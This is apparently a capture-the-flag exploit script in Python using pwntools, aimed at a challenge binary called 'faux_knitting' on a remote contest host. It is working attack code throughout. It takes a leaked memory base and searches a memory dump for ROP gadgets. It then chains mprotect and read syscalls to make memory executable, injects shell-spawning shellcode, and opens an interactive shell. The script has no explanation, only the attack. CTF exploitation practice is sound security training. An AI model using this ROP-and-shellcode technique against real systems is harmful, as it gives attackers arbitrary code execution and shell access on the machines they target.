#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from math import floor
import subprocess

exe = context.binary = ELF('./faux_knitting')

host = args.HOST or 'faux-01.hfsc.tf'
port = int(args.PORT or 54123)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *0x5555555554ED
continue
'''.format(**locals())


from time import sleep

gadgets = { 
    'rax' : { 'optcode' : b'X\xc3', 'idx' : 0  },
    'rdi' : { 'optcode' : b'_\xc3', 'idx' : 0  },
    'rsi' : { 'optcode' : b'^\xc3', 'idx' : 0  },
    'rdx' : { 'optcode' : b'Z\xc3', 'idx' : 0  },
    'rcx' : { 'optcode' : b'Y\xc3', 'idx' : 0  },
    'syscall' : { 'optcode' : b'\x0f\x05\xc3', 'idx' : 0  },


}
# -- Exploit goes here --

def createSyscallRop(rax, rdi, rsi, rdx, rcx, gadgets):
    rop = b''
    rop += p64(gadgets['rax']['idx'])
    rop +=p64(rax)
    rop += p64(gadgets['rdi']['idx'])
    rop +=p64(rdi)
    rop += p64(gadgets['rsi']['idx'])
    rop +=p64(rsi)
    rop += p64(gadgets['rdx']['idx'])
    rop +=p64(rdx)
    rop += p64(gadgets['rcx']['idx'])
    rop +=p64(rcx)
    rop += p64(gadgets['syscall']['idx'])
    return rop

io = start()
io.recvuntil(b'mem:')
base = int(io.recvline().strip(), 16)
subprocess.run(["./a.out"])
rop = b''
rawData = open('memory.bin', 'rb').read()
for gadget in gadgets:
    try:
        idx =  rawData.index(gadgets[gadget]['optcode']) + base
        gadgets[gadget]['idx'] = idx
        print(f'register: {gadget}, index: {hex(idx)}')
    except:
        print(f'could not find dagets for {gadget}, try again')
        exit(1)

rop = b''


# mprotect
rop = createSyscallRop(constants.SYS_mprotect, base, 0x800000, 7, 0, gadgets)
rop += createSyscallRop(constants.SYS_read, 0, base, 0x100, 0, gadgets)
rop += p64(base)
io.sendline(rop)
from time import sleep
sleep(1)
io.sendline(asm(shellcraft.sh()))
io.interactive()
   

